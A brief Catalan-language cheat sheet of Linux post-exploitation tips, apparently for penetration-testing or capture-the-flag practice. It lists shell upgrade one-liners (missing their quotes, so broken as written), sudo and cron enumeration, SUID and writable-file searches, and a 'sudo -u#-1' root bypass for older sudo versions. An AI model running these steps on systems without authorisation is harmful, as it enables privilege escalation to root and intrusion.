# Tips Shells Linux

### Si la shell no és interactiva

* `python -c import pty;pty.spawn("/bin/bash")`

* `python3 -c import pty;pty.spawn("/bin/bash")`


### Métodes d'escalada senzills

* Comprovem quins binaris o scripts podem executar com sudo sense contrasenya:

  `sudo -l`

* Comprovem la versió de sudo amb `sudo -v`, si és inferior a 1.28 executem:

  `sudo -u#-1 /bin/bash`


### Comprovar treballs de cron

* `ls -lah /etc/cron*`

  o

* `cat /var/log/syslog | grep cron`


### Comprovem arxius amb permisos write

* `find / -writable -type d 2>/dev/null`

  o

* `find / -perm -u=s -type f 2>/dev/null`